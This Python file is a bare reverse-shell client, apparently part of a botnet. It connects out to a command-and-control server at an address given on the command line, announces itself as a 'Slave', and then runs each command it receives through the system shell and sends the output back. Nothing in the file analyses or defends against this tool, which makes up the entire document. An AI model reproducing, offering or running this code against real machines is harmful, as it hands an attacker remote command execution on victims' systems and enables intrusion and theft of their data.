import socket
import os
import subprocess
import sys
import time
from datetime import datetime
from optparse import OptionParser


def parse_cli_args():
    parser = OptionParser()
    parser.add_option('-a', '--socket_addr', dest='socket_addr')
    parser.add_option('-p', '--socket_port', dest='socket_port')
    options, args = parser.parse_args()
    return {
        'server_addr': options.socket_addr,
        'server_port': options.socket_port
    }

def get_ip():
    return ''

def handle_payload(cmd, *args, **kwargs):
    # cli_args = args + kwargs.items()
    command_payload = [cmd.decode('utf-8')] + list(args)
    response = subprocess.check_output(command_payload, shell=True)
    return response

def main(sock_addr, sock_port):
    """
        Main program entrypoint,
        handles error in try/catch block and 
        reestablishes connection on unhandled exceptions
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # sock.settimeout(5)

    opts = parse_cli_args()
    server_addr = opts['server_addr'], int(opts['server_port'])
    try:
        sock.connect(server_addr)
    except socket.error as msg:
        print(msg)
        sys.exit(1)

    try:
        ip_addr = get_ip()
        connected_msg = f'Slave {ip_addr} initiated at {datetime.now()}'.encode('utf-8')
        sock.sendall(connected_msg)
        print(connected_msg)
        while True:
            try:
                data = sock.recv(1024)
                print(f'Received at : {datetime.now()} << {data}')
                # handle payload
                capture = handle_payload(cmd=data)
                sock.sendall(capture)
            except socket.timeout:
                print('Timeout receiving command data from Command&Control')
                time.sleep(1)
    finally:
        sock.close()
        # main(sock_addr, sock_port)


if __name__ == '__main__':
    opts = parse_cli_args()
    main(
        opts['server_addr'], 
        opts['server_port']
    )
